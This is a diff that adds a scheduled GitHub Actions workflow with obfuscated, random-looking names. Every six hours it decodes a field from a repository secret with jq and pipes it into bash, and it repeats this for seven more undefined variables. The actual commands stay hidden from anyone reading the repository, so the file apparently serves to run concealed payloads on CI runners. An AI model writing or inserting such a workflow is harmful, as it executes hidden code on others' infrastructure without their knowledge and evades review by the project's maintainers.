@@ -1,0 +1,26 @@
+name: proportionstay
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: proportionstay
+        env:
+          hfa730: ${{ secrets.hfa730 }}
+        run: |
+          echo $hfa730 | jq -r .byjq19 | /bin/bash
+          echo $vkg11 | jq -r .wt6147 | /bin/bash
+          echo $figfz9849 | jq -r .hhj93 | /bin/bash
+          echo $jm84254 | jq -r .fua0 | /bin/bash
+          echo $fzf62 | jq -r .tync18782 | /bin/bash
+          echo $gi1748 | jq -r .ntcy69 | /bin/bash
+          echo $s0042 | jq -r .j024 | /bin/bash
+          echo $ywyni2802 | jq -r .z59076 | /bin/bash
+
